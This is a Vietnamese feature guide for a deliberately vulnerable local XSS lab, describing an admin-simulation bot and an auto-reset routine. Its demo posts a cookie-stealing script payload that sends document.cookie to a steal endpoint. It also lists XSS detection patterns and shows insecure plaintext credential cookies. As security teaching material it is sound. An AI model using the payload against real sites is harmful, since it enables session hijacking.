# 🤖 Tính Năng Tự Động - Auto Features v1.3.2

## Tổng Quan

Dự án đã được nâng cấp với **2 tính năng tự động** để cải thiện trải nghiệm test và demo:

1. **Auto-Test** - Tự động giả lập admin xem comment sau 5 giây
2. **Auto-Reset** - Tự động xóa XSS comments khi về trang chính

---

## 🎯 1. Auto-Test (Giả Lập Admin)

### Vấn Đề Cũ

-   Phải mở browser thứ 2 để giả admin
-   Phải đăng nhập admin thủ công
-   Khó demo và debug XSS attack

### Giải Pháp

Sau khi user post comment, server **tự động giả lập admin xem comment sau 5 giây**.

### Workflow

```
User post comment
       ↓
Server response
       ↓
⏰ Countdown 5 giây
       ↓
👤 Auto giả lập admin request /lab/auth
       ↓
✅ Admin "xem" trang với cookie admin
       ↓
🚨 XSS payload execute → Stolen cookie logged
```

### Server Console Output

```
Login thành công: user1 - Cookie: user1:password1
⏰ [AUTO-TEST] Admin sẽ xem comment sau 5 giây...
👤 [AUTO-TEST] Admin đang xem comment...
✅ [AUTO-TEST] Admin đã xem trang (status: 200)
🚨 [AUTO-TEST] XSS payload detected! Script sẽ thực thi trên browser của admin.
🚨 STOLEN COOKIE RECEIVED:
Timestamp: 2025-10-16T17:15:30.123Z
Cookie: auth=admin:admin123
IP: ::1
User-Agent: Auto-Test-Bot (Admin Simulation)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

### Demo

```bash
# 1. Login
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"password1"}'

# 2. Post XSS
curl -X POST http://localhost:3000/api/comment \
  -H "Content-Type: application/json" \
  -H "Cookie: auth=user1:password1" \
  -d '{"comment":"<script>fetch(\"/api/steal?cookie=\"+document.cookie)</script>"}'

# 3. Đợi 5 giây → Check server console → Stolen cookie!
```

---

## 🔄 2. Auto-Reset (Xóa XSS Comments)

### Vấn Đề Cũ

-   Post XSS payload → Bị redirect liên tục
-   Phải restart server để reset
-   Khó test nhiều payloads

### Giải Pháp

Khi truy cập trang chính `/`, server **tự động phát hiện và xóa XSS comments**.

### Workflow

```
User truy cập http://localhost:3000/
       ↓
🔄 Server kiểm tra comments có XSS?
       ↓
Có: <script>, <img>, <svg>, onerror
       ↓
🧹 Xóa TẤT CẢ comments
       ↓
✅ Khôi phục 4 comments mặc định
       ↓
Trang chính hiển thị bình thường
```

### Phát Hiện XSS Patterns

Server check comments có chứa:

-   `<script` → Script injection
-   `<img` → Image-based XSS
-   `<svg` → SVG-based XSS
-   `onerror` → Event handler XSS

### Server Console Output

```
🔄 [AUTO-RESET] Đang kiểm tra và reset comments...
🧹 [AUTO-RESET] Tìm thấy 3 XSS comments, đang xóa...
✅ [AUTO-RESET] Đã xóa tất cả comments
✅ [AUTO-RESET] Đã khôi phục comments mặc định
```

### Comments Mặc Định

Sau khi reset, 4 comments sau được tạo lại:

1. **admin**: "Chào mừng đến với hệ thống!"
2. **admin**: "🚩 FLAG: FLAG{4uth_Byp4ss_C00k13_H4ck} - Chỉ admin mới thấy được!"
3. **user1**: "Tính năng rất hay!"
4. **user2**: "Mình đã đăng nhập thành công!"

### Demo

```bash
# Sau khi test XSS, về trang chính để reset:
curl http://localhost:3000/

# Hoặc mở browser:
# http://localhost:3000/
```

---

## 🚀 Test Script Tích Hợp

File `test-auto.sh` test cả 2 tính năng:

```bash
bash test-auto.sh
```

### Output

```
╔══════════════════════════════════════════════════════════════╗
║         🧪 AUTO-TEST XSS SESSION HIJACKING                  ║
╚══════════════════════════════════════════════════════════════╝

📝 Step 1: Login as user1
📝 Step 2: Post XSS payload
⏰ Step 3: Auto-Test Triggered! (đợi 5s)
✅ Step 4: Check Results
🔄 Step 5: Auto-Reset Comments

╔══════════════════════════════════════════════════════════════╗
║          ✨ LAB RESET - READY FOR NEXT TEST! ✨            ║
╚══════════════════════════════════════════════════════════════╝
```

---

## 💡 Lợi Ích

### Auto-Test

✅ Không cần browser thứ 2  
✅ Không cần đăng nhập admin thủ công  
✅ Test XSS payload nhanh chóng  
✅ Log chi tiết để debug  
✅ Demo trực quan cho education

### Auto-Reset

✅ Tránh bị redirect liên tục  
✅ Không cần restart server  
✅ Reset lab về trạng thái ban đầu  
✅ Test nhiều payloads dễ dàng  
✅ Clean environment sau mỗi test

---

## ⚙️ Cấu Hình

### Thay Đổi Delay (Auto-Test)

File `server.js` - dòng ~345:

```javascript
setTimeout(() => {
    // ... auto-test code ...
}, 5000);  // 5000ms = 5 giây

// Đổi thành 3 giây:
}, 3000);
```

### Thay Đổi XSS Patterns (Auto-Reset)

File `server.js` - dòng ~167:

```javascript
db.all("SELECT * FROM comments WHERE comment LIKE '%<script%' OR comment LIKE '%<img%' OR comment LIKE '%<svg%' OR comment LIKE '%onerror%'", ...);

// Thêm pattern:
... OR comment LIKE '%<iframe%' OR comment LIKE '%javascript:%'", ...);
```

### Tắt Auto-Test

Comment out setTimeout block trong `/api/comment`:

```javascript
// AUTO-TEST: Giả lập admin xem comment sau 5 giây
// console.log("⏰ [AUTO-TEST] Admin sẽ xem comment sau 5 giây...");
// setTimeout(() => { ... }, 5000);
```

### Tắt Auto-Reset

Comment out auto-reset block trong `/` route:

```javascript
app.get("/", (req, res) => {
    // Comment out auto-reset code
    res.render("index");
});
```

---

## 🔍 Technical Details

### Auto-Test Implementation

```javascript
setTimeout(() => {
    const http = require("http");

    const options = {
        hostname: "localhost",
        port: PORT,
        path: "/lab/auth",
        method: "GET",
        headers: {
            Cookie: "auth=admin:admin123",
            "User-Agent": "Auto-Test-Bot (Admin Simulation)",
        },
    };

    const simulateReq = http.request(options, (simulateRes) => {
        let data = "";

        simulateRes.on("data", (chunk) => {
            data += chunk;
        });

        simulateRes.on("end", () => {
            console.log(
                "✅ [AUTO-TEST] Admin đã xem trang (status: " +
                    simulateRes.statusCode +
                    ")"
            );

            if (data.includes("<script>")) {
                console.log("🚨 [AUTO-TEST] XSS payload detected!");
            }
        });
    });

    simulateReq.end();
}, 5000);
```

### Auto-Reset Implementation

```javascript
app.get("/", (req, res) => {
    db.all(
        "SELECT * FROM comments WHERE comment LIKE '%<script%' OR ...",
        [],
        (err, xssComments) => {
            if (!err && xssComments && xssComments.length > 0) {
                console.log(
                    `🧹 [AUTO-RESET] Tìm thấy ${xssComments.length} XSS comments, đang xóa...`
                );

                db.run("DELETE FROM comments", (err) => {
                    if (!err) {
                        // Khôi phục comments mặc định
                        const stmt = db.prepare(
                            "INSERT INTO comments (username, comment) VALUES (?, ?)"
                        );
                        defaultComments.forEach((c) =>
                            stmt.run(c.username, c.comment)
                        );
                        stmt.finalize();
                    }
                });
            }
        }
    );

    res.render("index");
});
```

---

## ⚠️ Security Note

**CHỈ SỬ DỤNG TRONG LAB/EDUCATION!**

-   ❌ KHÔNG deploy production
-   ❌ KHÔNG dùng cho real applications
-   ✅ Chỉ dùng để học và demo security vulnerabilities

---

## 📚 Tài Liệu Liên Quan

-   `AUTO-TEST.md` - Chi tiết về Auto-Test và Auto-Reset
-   `XSS-DEMO.md` - Hướng dẫn XSS và Session Hijacking
-   `AUTH-GUIDE.md` - Authentication Bypass Lab guide
-   `CHANGELOG.md` - Lịch sử thay đổi
-   `test-auto.sh` - Script test tự động

---

**Version:** 1.3.2  
**Date:** 2025-10-16  
**Features:**

-   ⏰ Auto-Test: Admin simulation (5s delay)
-   🔄 Auto-Reset: XSS cleanup on homepage visit
